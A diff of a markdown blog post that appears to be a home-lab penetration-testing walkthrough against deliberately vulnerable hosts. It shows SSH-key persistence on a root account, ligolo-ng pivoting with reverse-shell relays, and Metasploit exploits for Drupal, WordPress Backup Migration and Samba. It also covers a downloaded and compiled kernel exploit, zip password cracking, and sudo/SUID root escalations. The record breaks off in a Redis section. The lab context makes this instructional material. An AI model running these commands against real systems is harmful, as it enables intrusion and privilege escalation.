@@ -1,4 +1,4 @@
----
+<img width="1111" height="344" alt="image" src="https://github.com/user-attachments/assets/20673d28-3f25-4c4a-be84-b865858ae8a7" />---
 title: " Home Lab 1 : Isolate "
 date: 2026-07-10 00:00:00 +0000
 categories: [Home Lab ]
@@ -1642,7 +1642,7 @@ sudo nano /etc/exports
 Inside the File we add our share : 
 
 ```bash
-/srv/share *(rw,sync,no_subtree_check)
+/srv/share *(rw,sync,no_subtree_check,insecure)
 ```
 
 Explanation:
@@ -1656,7 +1656,8 @@ Explanation:
 We save the file then we apply the changes 
 
 ```bash
-sudo exportfs -a
+sudo /usr/sbin/exportfs -ra
+sudo /usr/sbin/exportfs -v
 ```
 
 <img width="1207" height="452" alt="image" src="https://github.com/user-attachments/assets/a27ef306-27a5-4665-a28f-2d4845930a96" />
@@ -1692,7 +1693,7 @@ Automation.txt
 
 [Windows-DC]
 Username: Administrator
-Password: N7!qV4#zL9@xP2$k
+Password: Password@123456789
 
 [Backup-Service]
 Username: svc_backup
@@ -3751,7 +3752,713 @@ Now we will be using this Box to pivot to the Internal Network so we need to kee
 
 We can do that by getting the Root Private key , enable root login if not enabled so that we can login as root more reliabely . 
 
+First we check the root .ssh directory : 
+
+<img width="723" height="266" alt="image" src="https://github.com/user-attachments/assets/d184a9ed-7c6a-48f2-b125-1d5426128e7f" />
+
+We see that we don't have any keys yet , if we check the SSH config : 
+
+```bash
+cat /etc/ssh/sshd_config
+```
+
+We see that it is set to default : 
+
+<img width="660" height="344" alt="image" src="https://github.com/user-attachments/assets/765ffe73-d117-4df5-8c48-eb14f29fcaad" />
+
+This means root can login but password is disabled , we need to generate a private key , then transfer it into the Target machine and save it in the /root/.ssh folder . 
+
+```bash
+# On our Kali box :
+
+ssh-keygen -t ed25519 -f ~/.ssh/fail2copy_root -N ""
+```
+
+- ssh-keygen : generates a new SSH keypair (private + public key)
+- t ed25519 : key type/algorithm, ed25519 instead of the older rsa, it's shorter, faster, and just as secure (modern default choice)
+- f ~/.ssh/fail2copy_root : output file path for the private key, so you get fail2copy_root (private) and fail2copy_root.pub (public) in ~/.ssh/, named so you know exactly which box this key is for instead of overwriting your default id_ed25519
+- N "" : sets the passphrase to empty, so it generates the key without prompting you to type a passphrase
+
+<img width="1193" height="664" alt="image" src="https://github.com/user-attachments/assets/8f300ef1-ed25-41af-884d-fef71e158843" />
+
+Here **fail2copy_root.pub** is the public key that we will transfer into the target machine , and the **fail2copy_root** , is the private key we will use to login . 
+
+First on our Kali box , we set up our Python server on the same folder where we have our Keys .  
+
+```bash
+python3 -m http.server 80
+```
+
+<img width="1111" height="344" alt="image" src="https://github.com/user-attachments/assets/8e043502-b8db-45a0-b819-78345f15ef72" />
+
+Now from the target box , we can download it using wget or curl .
+
+<img width="1274" height="720" alt="image" src="https://github.com/user-attachments/assets/efc27c0d-a98a-470f-be61-539883c4cc61" />
+
+Once downloaded , we need to rename it to `authorized_keys` , since that's the exact filename sshd looks for inside `/root/.ssh` , and lock down its permissions so it's not too open :
+
+```bash
+mv fail2copy_root.pub authorized_keys
+chmod 600 authorized_keys
+```
+
+Now we can try to login using our Private key :
+
+```bash
+ssh -i fail2copy_root root@192.168.32.147
+```
+
+<img width="1413" height="872" alt="image" src="https://github.com/user-attachments/assets/18eebf50-96d0-4bc9-a14b-cae1744fbefb" />
+
+Now that we made our access more persistent , we can move to the Pivoting section . 
 
 
+#### Pivoting/Tunneling : 
+
+
+Now notice how our Kali machine is unable to reach any of the internal Hosts :
+
+<img width="1792" height="704" alt="image" src="https://github.com/user-attachments/assets/bd8d318a-1760-4ed2-b724-7266e95b7a57" />
+
+We can use a tool like ligolo or chisel , to give us full access to the Internal Network , by using our compromised Box as the pivot point , that all traffic gets routed through . i prefer ligolo since it's faster , it creates a new virtual NIC for us that routes traffic straight through the Pivot Box , no proxychains needed like you'd typically use with chisel for full subnet access , so it's cleaner and faster overall .
+
+First we check if the machine has access to any new Networks : 
+
+```bash
+ip a
+```
+
+<img width="1333" height="638" alt="image" src="https://github.com/user-attachments/assets/7dcd97ae-3bdb-4df2-9b5e-b9218009f6e3" />
+
+We find the 10.10.10.0/24 Network which is Our Internal netowrk . Importing Tools to this host to reach and exploit the other targets will be very noisy and it will demand a lot of dependencies for tools and all of that ,just not practical overall, so using this Box as our Pivot point is the best option here . For this we use Chisel : 
+
+To use Chisel , we need to setup the ligolo server , then transfer the agent to the victim machine and run it on it to connect back to our Ligolo Server . 
+
+This is the link to Install the agent : 
+
+```bash
+https://github.com/nicocha30/ligolo-ng/releases/tag/v0.9
+```
+
+You need to install the Linux one , then you can follow along .
+
+First we need to create a new Network Interface then run Ligolo : 
+
+```bash
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up  
+
+# Launch ligolo server from kali with self signed certs : 
+sudo ligolo-proxy -selfcert
+```
+
+<img width="1363" height="514" alt="image" src="https://github.com/user-attachments/assets/d9cc82cf-5a59-45f4-9a0d-6070cd12250e" />
+
+Now that the NIC is created , it should show DOWN , this is normal since we haven't gotten a connection back yet . Launch Ligolo :
+
+<img width="1568" height="654" alt="image" src="https://github.com/user-attachments/assets/e36440b7-62f5-4a32-aa6f-bdaf20a6b1e0" />
+
+Then we need to import the Agent to the target machine , and make it executable . 
+
+```bash
+# On our Kali :
+python3 -m http.server
+
+# On target :
+wget http://192.168.32.134/agent
+chmod +x agent
+```
+
+<img width="1766" height="870" alt="image" src="https://github.com/user-attachments/assets/d48ca801-04d0-4b47-80cf-2b5badb55430" />
+
+Now all we need to do is run the agent to connect back to us , Ligolo runs on port 11601 by default :
+ 
+```bash
+./agent -connect <Attack IP>:11601 -ignore-cert&
+
+# & was added just to make it run a job in the background rather than blocking our terminal 
+```
+
+<img width="1197" height="412" alt="image" src="https://github.com/user-attachments/assets/9abe564d-a5b4-4329-8dd4-5a4e16cfe671" />
+
+Now if we go back to our Ligolo server , we should see the connection . 
+
+<img width="1550" height="719" alt="image" src="https://github.com/user-attachments/assets/23def129-fcfc-46c1-aef1-2ecdb7d5dfa1" />
+
+Now we just specify the session we want to interact with : 
+
+```bash
+session
+1
+```
+
+From there we can check the Network Interfaces that exist : 
+
+```bash
+# From inside the session :
+
+ifconfig
+```
+
+<img width="1170" height="881" alt="image" src="https://github.com/user-attachments/assets/5d439521-6a12-4b8d-acf8-984d8f0e5fa1" />
+
+We see the 10.10.10.0/24 Network , which is the Internal Network . Now to create the connection we just link the newly created NIC to this Internal Network Segment , then we start the connection from our Ligolo server . 
+
+```bash
+# From our terminal :
+
+sudo ip route add 10.10.10.0/24 dev ligolo
+
+# From Ligolo :
+start 
+```
+
+<img width="1570" height="596" alt="image" src="https://github.com/user-attachments/assets/515be812-7a21-4caa-bf06-7bdbdc0c82fe" />
+
+We see that it created the connection , and the NIC is now UP .
+
+Now we can test pinging the Internal IP address for our Host directly from our Kali box : 
+
+<img width="1334" height="682" alt="image" src="https://github.com/user-attachments/assets/92299611-5092-413f-a446-3f6889aceb98" />
+
+Perfect we are able to reach the Internal Network . Moving on to exploiting the Intenal Hosts :
+
+#### Dirty2Geddon : 
+
+First we scan the Entire Internal Network to get an idea of how many hosts exist on the Network . 
+
+<img width="1186" height="847" alt="image" src="https://github.com/user-attachments/assets/b44cca71-4c98-4c3c-9b8a-288e9655e9f1" />
+
+We are able to Identify all of the Internal Hosts : 
+
+```bash
+10.10.10.10 (Fail2Copy) 
+10.10.10.20
+10.10.10.30
+10.10.10.40
+10.10.10.50
+```
+
+We will start with the 10.10.10.20 which is the Dirty2Geddon Box :
+
+First let's scan all ports , then use Version and default Scripts scans to see if we find any outdated service versions :
+
+```bash
+nmap -p- 10.10.10.20 -T5 
+nmap -p80 10.10.10.20 -sVC 
+```
+<img width="1368" height="856" alt="image" src="https://github.com/user-attachments/assets/81b5aeae-ce2f-4e37-af83-58aff7745691" />
+
+We are able to find the Drupal Version used which is Drupal 7 . 
+
+Since this is using Drupal , we can use a tool like droopscan to enumerate the website further . 
+
+```bash
+https://github.com/SamJoan/droopescan
+```
+
+We can install it using pip , but first create your virtual env : 
+
+```bash
+python3 -m venv venv
+source venv/bin/activate
+pip install droopescan
+```
+
+<img width="1084" height="868" alt="image" src="https://github.com/user-attachments/assets/c239d0d0-ccf7-4667-87fc-7e48bfa31972" />
+
+Looking at the doc , to run it : 
+
+```bash
+droopescan scan drupal -u http://example.org/ -t 32
+```
+
+Once you run the tool , it won't work , this is because many libraries that the tools uses were removed from Python 3.12 .  
+
+<img width="1160" height="500" alt="image" src="https://github.com/user-attachments/assets/51446870-b582-4f92-809a-1029a5eb8019" />
+
+If you are running an old version of python this can work for you , if not just use a recent tool , i will be using CMSeek since it is still maintainable . 
+
+```bash
+git clone https://github.com/Tuhinshubhra/CMSeeK
+cd CMSeeK
+pip install -r requirements.txt
+python3 cmseek.py -h
+```
+
+<img width="1755" height="617" alt="image" src="https://github.com/user-attachments/assets/cd4c828b-6339-4b03-a49d-3e09c06e6bb6" />
+
+Once it's done we can just run the tool : 
+
+```bash
+python3 cmseek.py -u 10.10.10.20
+```
+
+<img width="1024" height="810" alt="image" src="https://github.com/user-attachments/assets/46f29412-4110-4a28-ac0d-e2a3b162e62d" />
+
+We get the version but not the exact version . Let's check via manual enumeration , usually if we can access the /ChangeLog , which is by default , we can find the exact version : 
+
+```bash
+curl -s http://10.10.10.20/CHANGELOG.txt | head -20
+```
+
+<img width="1069" height="644" alt="image" src="https://github.com/user-attachments/assets/ef1daa88-0971-44e0-a185-1751ff5a705c" />
+
+Perfect the version is 7.57 , we can check online for vulnerabilities or some POC for exploits that targets this exact version , but before let's check Searchsploit : 
+
+```bash
+searchsploit Drupal 7.57
+```
+
+<img width="1849" height="488" alt="image" src="https://github.com/user-attachments/assets/274057fd-cdf2-4352-91d0-858c52c27c39" />
+
+We find many RCE Exploits ,we need one that doesn't require Authentication , we will go with the Metasploit one since it is usually more stable , first we need to launch Metasploit : 
+
+```bash
+msfconsole
+search drupal 7
+use 1
+```
+
+<img width="1611" height="778" alt="image" src="https://github.com/user-attachments/assets/6b27613e-1059-4e2f-ab6e-41b421fdb392" />
+
+We're using DrupalGeddon2 , let's check the parameters that we need to provide : 
+
+<img width="1204" height="758" alt="image" src="https://github.com/user-attachments/assets/7e741866-1e4a-4465-847b-586210125eaa" />
+
+It requires :
+
+- LHOST : which is our listener , in this case our IP address .
+- RHOSTS : The target IP Address
+- RPORT : the target Port running the Drupal Service
+- LPORT : The port we will be listenning on
+- TARGET URI : Where the Drupal site is located , in this case it's the root directory /
+- Exploit Target : we will keep the default one , which is PHP in memory , if this doesn't work , we can change it
+
+```bash
+set RHOSTS 10.10.10.20
+run
+```
+
+<img width="1117" height="698" alt="image" src="https://github.com/user-attachments/assets/f069b5f3-ba1e-437b-b98d-1593ad25c8cd" />
+
+We see that the exploit works , but we don't get any session .
+
+This is because Ligolo lets us reach into the Internal Network , but it doesn't work the other way around , the Internal boxes can't reach our Kali machine directly , so when the payload tries to connect back to us it just fails . to fix that , we add a listener on the Ligolo Proxy , this makes the Pivot Box itself open port 4444 and forward anything that hits it straight back to our real listener on Kali . so instead of the target trying to reach Kali directly , which it can't , it connects to the Pivot Box instead , which is the one thing it actually can reach , and that's what relays it back to us .
+
+Now back on our Ligolo Proxy server : 
+
+```bash
+ listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
+```
+
+- listener_add : tells the ligolo-ng proxy to create a new listener, but running on the agent (the pivot box), not on Kali
+- addr 0.0.0.0:4444 : the address/port the listener opens on the pivot box itself, 0.0.0.0 means it listens on all of the pivot box's interfaces, so anything on the internal network that can reach the pivot box on port 4444 will hit this listener to .
+- 127.0.0.1:4444 where the traffic gets forwarded once it arrives at Kali through the tunnel, 127.0.0.1 here refers to Kali's own loopback, since that's where your real msf handler is actually listening
+- tcp : protocol for the listener, TCP in this case (matches your reverse_tcp payload
+
+Now back to our exploit , we need to modify the LHOST to match the one of our Pivot Box , the LPORT will stay the same 4444 .
+
+```bash
+set LHOST 10.10.10.10
+set LPORT 4444
+run
+```
+
+<img width="1153" height="514" alt="image" src="https://github.com/user-attachments/assets/17135056-0fa0-4835-80a0-190525fe6269" />
+
+We got our meterpreter session :)
+
+If we wanted a shell , just type shell : 
+
+```bash
+shell
+bash -i # Just to make it Somewhat interactive .
+```
+
+<img width="1215" height="396" alt="image" src="https://github.com/user-attachments/assets/27609534-c53e-4207-ae09-c4b52331e8fc" />
+
+Now for privesc it's pretty easy to import tools using Meterpreter , we just  go back to our meterpreter session and upload or download specific files . 
+
+You could import Linpeas and run it to find different ways to privesc . But in our case to save time , we will just do some manual Enumeration starting with the kernel version : 
+
+```bash
+uname -a
+```
+
+<img width="1414" height="446" alt="image" src="https://github.com/user-attachments/assets/a586bd38-ce8d-4b4d-83ac-dd2766a7f8da" />
+
+We see that the kernel version is 6.17.0-23 , this one is pretty old , so it might be vulnerable to the recent Kernel exploits , we already tested CopyFail , let's check DirtyFrag : 
+
+```bash
+https://github.com/v4bel/dirtyfrag
+```
+
+We first Download the exploit , compile it on our Kali machine , then transfer it to the target box using our Meterpreter session . 
+
+```bash
+wget https://raw.githubusercontent.com/V4bel/dirtyfrag/refs/heads/master/exp.c
+gcc exp.c -o exp
+```
+
+<img width="1602" height="738" alt="image" src="https://github.com/user-attachments/assets/bbd76c22-eee3-462e-8de5-497780a476e8" />
+
+Now finally , we just transfer it using Meterpreter , back to our shell , we can go back to our Meterpreter session by either typing bg or CTRL+Z : 
+
+<img width="1413" height="486" alt="image" src="https://github.com/user-attachments/assets/fa48d840-cefe-4feb-878a-f6590d5924f8" />
+
+Now to navigate our Kali machine , we need to add l before the commands we usually run : 
+
+```bash
+pwd : this will show us the current location inside the target machine
+lpwd : this will show us the location of our Kali machine instead .
+cd : Navigate the target file system
+lcd : Navigate the kali file system
+ls : List files on the target
+lls : List files locally 
+```
+
+<img width="988" height="752" alt="image" src="https://github.com/user-attachments/assets/e84bcba7-5aea-4db0-bf30-23719e5bb267" />
+
+Now to import the exploit we use the meterpreter command upload : 
+
+```bash
+meterpreter> upload exp
+```
+<img width="1051" height="428" alt="image" src="https://github.com/user-attachments/assets/792b2450-eefa-41d3-8396-0c2061b31fa0" />
+
+Once we import it , we make it executable and finally we run it : 
+
+<img width="1198" height="478" alt="image" src="https://github.com/user-attachments/assets/06bfd4ee-0e8a-413a-926f-4dc6a6cafe39" />
+
+We see that we get a Root Shell once our exploit is executed . 
+
+Now we can move to the Third Box . 
+
+
+#### Backup : 
+
+This one is the 10.10.10.30 : 
+
+First we scan All ports , then we perfom a version and a script scan on the open ports .  
+
+<img width="1346" height="806" alt="image" src="https://github.com/user-attachments/assets/82fd4af6-d8cb-4895-a5e8-2a30e7f3ef55" />
+
+We don't get much , except the OS running . Both apache and SSH are up to date . 
+
+Let's check the website : 
+
+<img width="1319" height="667" alt="image" src="https://github.com/user-attachments/assets/b1865011-e7ff-446b-8e1c-59f660a377f8" />
+
+This is just the default Apache webpage , let's attempt Brute Forcing directories : 
+
+<img width="1515" height="752" alt="image" src="https://github.com/user-attachments/assets/307071ac-2cfb-44ae-8b49-58a4d269eb31" />
+
+We find /wordpress . which means there is a WP site hosted on this box , we can use a tool like WPscan to enumerate this further since this is a WP site : 
+
+```bash
+wpscan --update # First update the DB
+wpscan --url http://10.10.10.30/wordpress
+```
+
+<img width="1073" height="775" alt="image" src="https://github.com/user-attachments/assets/680c9008-5641-4525-829d-3b13c139e0f5" />
+
+If we check the Pluggins : 
+
+<img width="1230" height="550" alt="image" src="https://github.com/user-attachments/assets/975363c3-ba6b-4e2d-999d-82471f6e5377" />
+
+Passive Method didn't identify any Pluggins . We can try aggressive method : 
+
+```bash
+wpscan --url http://10.10.10.30/wordpress -e vp --plugins-detection aggressive
+```
+
+but sadly , even with aggressive detection , it came back with nothing :
+
+```bash
+[+] Enumerating Vulnerable Plugins (via Aggressive Methods)
+ Checking Known Locations - Time: 00:01:14 (7343 / 7343) 100.00%
+[i] No plugins Found.
+```
+
+7343 known locations checked and still nothing , which felt off for a box that's clearly built around a vulnerable plugin . the thing is , wpscan can only find what's in its bundled list , if the plugin's slug isn't in there , aggressive mode or not , it just won't see it . and no , an api key wouldn't help here either , that only pulls vulnerability data for plugins it already found , it doesn't help with detection .
+
+So let's try brute forcing the plugins directory ourselves with ffuf and a seclists wordlist :
+
+```bash
+ffuf -u http://10.10.10.30/wordpress/wp-content/plugins/FUZZ/readme.txt -w /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt -mc 200
+```
+
+<img width="1464" height="716" alt="image" src="https://github.com/user-attachments/assets/674ac6c3-acfc-4805-a088-7dafae05f98a" />
+
+This caught the default plugins like akismet , so we know the technique works , but still no sign of our target plugin . turns out the slug just isn't in that wordlist either , same blind spot as wpscan. I also checked if directory listing was enabled on the plugins folder , since it was enabled on wp-content/uploads/ earlier :
+
+```bash
+curl -s http://10.10.10.30/wordpress/wp-content/plugins/
+```
+
+But that came back empty , so no easy win there .
+
+At this point the automated tools have all struck out , so let's go fully manual . we already suspect the box is running the Backup Migration plugin , so instead of guessing slugs from a list , let's just hit its readme directly , every wordpress plugin ships a readme.txt at a predictable path with the version baked in :
+
+```bash
+curl http://10.10.10.30/wordpress/wp-content/plugins/backup-backup/readme.txt
+```
+
+And there it is :
+
+<img width="1401" height="664" alt="image" src="https://github.com/user-attachments/assets/b2d0599a-ef6d-427b-81c9-3689f2ac0b82" />
+
+Perfect , that confirms it , Backup Migration version 1.3.7 . the folder is backup-backup even though the plugin's display name is "Backup Migration" , which is exactly why the wordlists missed it . 
+
+Looking online we find that 1.3.7 is vulnerable to CVE-2023-6553 , an unauthenticated RCE , which is our way in .
+
+<img width="977" height="812" alt="image" src="https://github.com/user-attachments/assets/5ba72314-cca7-4be8-ad61-f1d3bafd2f3e" />
+
+There is a Metasploit Module as well that we can use : 
+
+```bash
+msfconsole
+use multi/http/wp_backup_migration_php_filter
+```
+
+<img width="1486" height="816" alt="image" src="https://github.com/user-attachments/assets/7e5b757d-76a5-43c3-a140-b0fc5faeb35d" />
+
+First close the first session we got on port 4444 , or create a new listener for this new exploit : 
+
+<img width="1293" height="832" alt="image" src="https://github.com/user-attachments/assets/43d01235-2270-4a6c-9935-ca2c31737cac" />
+
+We need to specify the RHOSTS, RPORT, LHOST, LPORT, and TargetURI . 
+
+- LHOST will again be the Pivot Box IP address .
+- LPORT will be 4444 as well since that's the listener we specified .
+- TargetURI will be /wordpress since it's not in the root folder this time.
+
+```bash
+set RHOSTS 10.10.10.30
+set LHOST 10.10.10.10
+set TARGETURI /wordpress
+run
+```
+
+<img width="1325" height="641" alt="image" src="https://github.com/user-attachments/assets/e5409428-687d-4b07-a0bf-963bb060bb49" />
+
+Now we have Initial access , for privesc , we can try manual exploiation first : 
+
+```bash
+id : Check for Groups and Which user . 
+cat /etc/passwd : Check other users on the machine . 
+sudo -l : which prog can be ran with root perm . 
+uname -sr / lsb_relase -a : Version + architecture .  
+find / -type f -perm -04000 -ls 2>/dev/null : Find binaries with SUID . 
+Check for Bash History .
+```
+
+A detailed section on Linux privesc if you wanted to try them on these boxes : 
+
+```bash
+https://elmehdilaassiri.github.io/posts/oscp-cpts-methodology/#linux-priv-escalation-
+```
+
+If we check the SUIDs : 
+
+<img width="1302" height="833" alt="image" src="https://github.com/user-attachments/assets/e6683456-74a3-4f53-aada-607b008fdc01" />
+
+We find a binary that isn't default one , /usr/bin find , this was going to get caught by Linpeas as well . 
+
+Now can check GTFOBINS to see if there are ways to abuse this SUID binary to get Root : 
+
+```bash
+https://gtfobins.org/
+```
+
+<img width="1414" height="864" alt="image" src="https://github.com/user-attachments/assets/366dd58f-063e-48f6-94e5-b76a5fed7c35" />
+
+We see that it is one of the vulnerable binaries : 
+
+Looking at the doc , to get root Shell we just execute : 
+
+```bash
+find . -exec /bin/sh -p \; -quit
+```
+
+<img width="1404" height="747" alt="image" src="https://github.com/user-attachments/assets/95eb8be3-62be-4ae7-b2b6-a661af09571b" />
+
+Perfect we got our Root access . 
+
+Now let's move to the other boxes .
+
+
+#### ORNN : 
+
+Checking the nmap scan from earlier , the ORNN machine is the host with this IP address : 10.10.10.40 as we can see from the open ports . 
+
+<img width="1283" height="833" alt="image" src="https://github.com/user-attachments/assets/ee29cb17-39f8-4040-a9e1-44aa5641a278" />
+
+We find many ports opened , the interesting ones are NFS,SMB and RPC .
+
+We'll scan for versions as well as default vuln scripts for these open ports :
+
+```bash
+nmap -p445,2049,139,111 10.10.10.40 -sVC
+```
+
+<img width="1010" height="818" alt="image" src="https://github.com/user-attachments/assets/7b356abd-0990-48b7-8412-ee33270d0235" />
+
+Looking at the version , we find SAMBA 3.0 , and from the nmap script , we find some general information like the hostname :
+
+<img width="1179" height="662" alt="image" src="https://github.com/user-attachments/assets/23d620dd-4c3e-4fd7-8bb7-2d99ff26fd98" />
+
+Now let's deeply enumerate each port :
+
+**NFS**
+
+First let's see if we can mount the NFS server on our kali machine without authentication .
+
+First let's try to list the shares that are available to us without authentication : 
+
+```bash
+showmount -e 10.10.10.40
+```
+
+<img width="891" height="247" alt="image" src="https://github.com/user-attachments/assets/d6a36c00-a0f7-4a94-8138-b89ab765aad9" />
+
+We get : 
+
+```bash
+/srv/share *
+```
+
+This means anything inside this share is available for everyone in the network to access . Now to mount this onto our Kali host :
+
+```bash
+mkdir nfs
+sudo mount -t nfs -o vers=3,nolock 10.10.10.40:/srv/share ~/HomeLab/nfs
+```
+
+<img width="1297" height="687" alt="image" src="https://github.com/user-attachments/assets/0f91d9a1-9f31-4f9f-9b20-88c92daae4a0" />
+
+Version 2 wasn't supported so we tried V3 . 
+
+Now finally let's unzip this file :
+
+<img width="1328" height="542" alt="image" src="https://github.com/user-attachments/assets/70814eda-fb1d-4edd-9ae4-ad116af52a83" />
+
+This requires a Passphrase which we don't have , we can try cracking it using John , first we transform it into a file format that John can crack using zip2john : 
+
+```bash
+zip2john nfs/windows-creds.zip > forjohn
+john --wordlist=/usr/share/wordlists/rockyou.txt  forjohn 
+```
+
+<img width="1796" height="590" alt="image" src="https://github.com/user-attachments/assets/790dee13-dbf9-49ca-96cb-c72a36593f68" />
+
+We are able to crack it using rockyou wordlist . Now we just unzip everything :
+
+<img width="1217" height="766" alt="image" src="https://github.com/user-attachments/assets/4e4fd8f5-789a-4a4a-9a43-e54724b76963" />
+
+If we access the Credentials folder we get a list of usernames and passwords that we can spray on the rest of the Boxes . 
+
+<img width="1280" height="752" alt="image" src="https://github.com/user-attachments/assets/044a2e05-d91f-42c7-a3da-82c3af323181" />
+
+Now that we've got some creds , we can test them for SSH access on ORNN first . 
+
+<img width="1292" height="564" alt="image" src="https://github.com/user-attachments/assets/88d2d91f-6dba-425a-9881-9264f2fe0ad6" />
+
+We see that we can Login via SSH . 
+
+for Privesc , we can import Linpeas, but in order to save time , the vulnerability is in the sudo binary permissions : 
+
+<img width="1394" height="458" alt="image" src="https://github.com/user-attachments/assets/4457d060-fa02-4296-8a6f-a94f4e48eb34" />
+
+We see that our user is able to execute the nano Binary as root , without needing password . 
+
+We can check GTFOBINS , to see if there are ways we can abuse this : 
+
+```bash
+https://gtfobins.org/gtfobins/nano/
+```
+
+<img width="1335" height="824" alt="image" src="https://github.com/user-attachments/assets/3c0c4bf0-034a-4597-a20e-1473a5afc066" />
+
+We see that there is a way we can get Root access : 
+
+- First Open a Terminal as root .
+- Press Ctrl+R (Read File), then Ctrl+X (Execute Command)
+- At the Command to execute: prompt, type:
+
+```bash  
+reset; sh 1>&0 2>&0
+```
+
+<img width="1104" height="857" alt="image" src="https://github.com/user-attachments/assets/c74d00cf-b3cd-40a3-b323-ec521b31ca7a" />
+
+Now if we execute it : 
+
+<img width="1432" height="694" alt="image" src="https://github.com/user-attachments/assets/c811c06b-f2a8-44d6-860f-21f6916b78d6" />
+
+We see that we got our Root Access by abusing the nano binary . 
+
+Now let's check the other ways we can get Root on this box : 
+
+
+**Samba :**
+
+Looking at the scan result , we see that the host is running SAMBA 3.0 , if we check searchsploit for known Vulnerabilities : 
+
+```bash
+searchsploit samba 3.0
+```
+
+<img width="1903" height="500" alt="image" src="https://github.com/user-attachments/assets/dfb9b649-a653-4da4-a3c1-8f7f57ddc4c3" />
+
+We find that there is a module in Metasploit for this version that will grant us RCE . 
+
+```bash
+msfconsole
+search samba 3.0
+```
+
+<img width="1680" height="750" alt="image" src="https://github.com/user-attachments/assets/9abcd1e5-26b0-48f0-ad4e-34d71f36e9ee" />
+
+We will use the first one : 
+
+<img width="1295" height="841" alt="image" src="https://github.com/user-attachments/assets/06f2bd2c-96d0-43e8-9678-829621e63228" />
+
+For the options , it needs the RHOSTS , LHOST which will be our Pivot IP , and for the LPORT , we will use a new one , first we need to create a new listener using Ligolo : 
+
+```bash
+listener_add --addr 0.0.0.0:5555 --to 127.0.0.1:5555 --tcp
+```
+
+<img width="1028" height="286" alt="image" src="https://github.com/user-attachments/assets/840b2137-f391-46b1-b3aa-6ed442087ff7" />
+
+Now back to our exploit , we specify the new LPORT , and the Pivot IP address : 
+
+```bash
+set LHOST 10.10.10.10
+set LPORT 5555
+set RHOSTS 10.10.10.40
+```
+
+<img width="1212" height="667" alt="image" src="https://github.com/user-attachments/assets/5d269a5f-abb3-41f6-8f2b-33ff78088cec" />
+
+The exploit will grant us immediate Root access . 
+
+Now moving on to the Redis server : 
+
+**Redis :**
+
+First let's try if we can access the Redis server : 
+
+<img width="742" height="292" alt="image" src="https://github.com/user-attachments/assets/b2af61fe-af19-42b0-851d-c9f1c1dc7a2e" />
+
+If we get PONG this means Redis server is reachable . 
+
+<img width="1093" height="799" alt="image" src="https://github.com/user-attachments/assets/17b5f8b9-cf1e-421e-ada7-e4787ca85843" />
+
+We are also able to gather more information about the Redis server , like the versions , directories,etc .
+
+Now let's try to generate our ssh keys , then put them inside the Redis DB , and login using them :
 
 
